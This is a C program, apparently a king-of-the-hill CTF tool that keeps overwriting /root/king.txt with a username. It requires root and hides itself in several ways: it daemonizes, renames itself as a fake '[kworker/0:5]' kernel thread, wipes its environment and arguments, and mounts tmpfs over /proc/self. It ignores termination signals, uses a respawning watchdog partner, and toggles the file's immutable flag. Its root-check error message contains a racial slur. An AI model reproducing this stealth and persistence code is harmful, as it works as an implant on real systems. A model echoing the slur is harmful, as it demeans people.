#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <linux/fs.h>
#include <errno.h>
#include <signal.h>

#define TARGET_PROCESS "[kworker/0:5]"
#define PROC_PATH "/proc/self"
#define FS_TYPE "tmpfs"
#define MOUNT_FLAG 0
#define MOUNT_DATA NULL
#define TARGET_PATH "/root/king.txt"
#define USER_NAME "username"

pid_t b_pid = -1;

void daemonize(){
    pid_t pid;

    // first fork 
    pid = fork();
    if(pid < 0) exit(EXIT_FAILURE);
    if(pid > 0) exit(EXIT_SUCCESS);     // parent exists

    // independent session
    if (setsid() < 0) exit(EXIT_FAILURE);

    // second fork
    pid = fork();
    if(pid < 0) exit(EXIT_FAILURE);
    if(pid > 0) exit(EXIT_SUCCESS);     // first child exists

    // set file perms
    umask(022);

    // checking for abnormal mounts
    if(chdir("/") < 0) exit(EXIT_FAILURE);

    // close every file descriptor that is opened
    long maxfd = sysconf(_SC_OPEN_MAX);
    if (maxfd < 0) maxfd = 1024;
    for (int i = (int)maxfd; i >= 0; i--) close(i);

    // redirect stdin, stdout, stderr to /dev/null
    int fd;

    fd = open("/dev/null", O_RDWR);
    dup2(fd, 0);        // stdin
    dup2(fd, 1);        // stdout
    dup2(fd, 2);        // stderr
}

void MaskIt(char **argv){
    // changing process name
    prctl(PR_SET_NAME, TARGET_PROCESS, 0, 0, 0);

    // wiping environment vars of the program
    extern char **environ;
    for(int i=0; environ[i] != NULL; i++) memset(environ[i], 0, strlen(environ[i]));

    // masking cli args
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], TARGET_PROCESS, strlen(TARGET_PROCESS));
    
    // mount tmpfs over /proc/self
    if(mount(FS_TYPE, PROC_PATH, FS_TYPE, MOUNT_FLAG, MOUNT_DATA) != 0) exit(EXIT_FAILURE);
}

void GetTheHill(){
    int fd;
    int ImmutFlag = FS_IMMUTABLE_FL;
    int ClearFlag = 0;

    // clearing any locks
    fd = open(TARGET_PATH, O_RDONLY);
    if(fd != -1){
    ioctl(fd, FS_IOC_SETFLAGS, &ClearFlag);
    close(fd);
    }

    // writing in the file
    fd = open(TARGET_PATH, O_WRONLY | O_TRUNC);
    if(fd != -1){
        write(fd, USER_NAME, strlen(USER_NAME));
        close(fd);
    }

    // locking the file again
    fd = open(TARGET_PATH, O_RDONLY);
    if(fd != -1){
        ioctl(fd, FS_IOC_SETFLAGS, &ImmutFlag);
        close(fd);
    }
}

// watchdog technique
void SpawnThePartner(){
    b_pid = fork();

    if(b_pid < 0) return;               // fork failed
    if(b_pid == 0) b_pid = getppid();   // b_pid is now the parent, this program is the child    
}

int main(int argc, char *argv[]){
    if(getuid() != 0){
        printf("root privileges needed negro!");
        exit(EXIT_FAILURE);
    }

    daemonize();
    MaskIt(argv);

    // ignore soft kill signals
    signal(SIGTERM, SIG_IGN);       // survive normal terminations like kill without -9
    signal(SIGHUP, SIG_IGN);        // survive without any parent or anything attached

    // initial spawn
    SpawnThePartner();

    // persistent loop
    while(1){
        // check if partner is alive
        if(kill(b_pid, 0) == -1 && errno == ESRCH) SpawnThePartner();       // flag 0 = send no signal
        
        // koth
        GetTheHill();

        // sleeping with a lil jitter for sync issues
        usleep(1500000 + (rand() % 1000000));
    }

    return EXIT_SUCCESS;
}